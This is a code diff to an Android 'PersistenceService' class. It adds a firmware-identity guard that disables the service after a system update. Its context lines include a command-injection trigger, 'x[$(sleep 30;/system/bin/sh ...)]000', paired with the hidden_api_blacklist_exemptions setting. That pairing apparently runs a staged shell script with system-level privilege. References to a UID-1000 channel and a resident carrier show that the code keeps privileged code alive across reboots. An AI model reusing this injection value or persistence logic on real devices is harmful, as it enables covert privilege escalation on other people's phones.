@@ -10,6 +10,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.IBinder;
+import android.os.Build;
 import android.provider.Settings;
 import android.util.Log;
 
@@ -29,6 +30,7 @@ public final class PersistenceService extends Service {
     private static final String RETRY_COUNT_KEY = "snusnu_retry_count";
     private static final String NATIVE_RESULT_KEY = "snusnu_native_result";
     private static final String BOOT_ID_KEY = "snusnu_persist_boot_id";
+    private static final String FIRMWARE_IDENTITY_KEY = "snusnu_firmware_identity";
     private static final String EXEMPTIONS = "hidden_api_blacklist_exemptions";
     private static final String TRIGGER =
             "x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000";
@@ -99,15 +101,26 @@ public final class PersistenceService extends Service {
             return;
         }
         String bootId = firstLine("/proc/sys/kernel/random/boot_id");
+        if (bootId != null) {
+            currentBootId = bootId;
+        }
+        String expectedFirmware = Settings.Global.getString(resolver,
+                FIRMWARE_IDENTITY_KEY);
+        if (!FirmwareGuard.matches(expectedFirmware, Build.DEVICE, Build.ID,
+                Build.VERSION.INCREMENTAL, Build.FINGERPRINT)) {
+            // Fail closed before creating the UID-1000 channel or starting the
+            // resident carrier. This catches an OTA after persistence install.
+            Settings.Global.putString(resolver, ENABLED_KEY, "0");
+            report("firmware_mismatch");
+            Log.e(TAG, "firmware identity changed; autonomous actor disabled");
+            return;
+        }
         Context deviceContext = createDeviceProtectedStorageContext();
         String previousBoot = deviceContext.getSharedPreferences("state", MODE_PRIVATE)
                 .getString("last_boot_id", "");
         if (bootId != null && bootId.equals(previousBoot)) {
             Log.i(TAG, "already attempted this boot");
             return;
-        }
-        if (bootId != null) {
-            currentBootId = bootId;
         }
         resolver.delete(Settings.Global.getUriFor(NATIVE_RESULT_KEY), null, null);
         Settings.Global.putString(resolver, REARM_STATUS_KEY, "pending");
